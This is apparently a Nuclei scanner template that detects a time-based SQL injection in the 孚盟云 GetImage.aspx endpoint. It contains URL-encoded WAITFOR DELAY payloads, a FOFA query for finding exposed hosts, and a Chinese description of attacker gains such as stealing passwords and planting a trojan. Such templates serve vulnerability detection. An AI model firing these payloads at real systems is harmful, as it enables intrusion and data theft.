http:
    - matchers:
        - condition: and
          dsl:
            - duration_1>=4 && duration_1<=5
            - duration_2>=8 && duration_2<=9
          type: dsl
      raw:
        - |
          GET /Common/GetImage.aspx?MouldID=%2d%31%27%57%41%49%54%46%4f%52%20%44%45%4c%41%59%27%30%3a%30%3a%34%27%2d%2d HTTP/1.1
          Host: {{Hostname}}
        - |
          GET /Common/GetImage.aspx?MouldID=%2d%31%27%57%41%49%54%46%4f%52%20%44%45%4c%41%59%27%30%3a%30%3a%38%27%2d%2d HTTP/1.1
          Host: {{Hostname}}
id: fumengyun-GetImage_aspx-sql-time
info:
    author: Superhero
    description: |-
        fofa: app="孚盟软件-孚盟云"
        孚盟云 GetImage.aspx接口处存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 孚盟云 GetImage.aspx SQL延时注入漏洞
    reference:
        - https://mp.weixin.qq.com/s/4UP6NlxXNSD_-C59lzIK6g
    severity: high
    tags: []
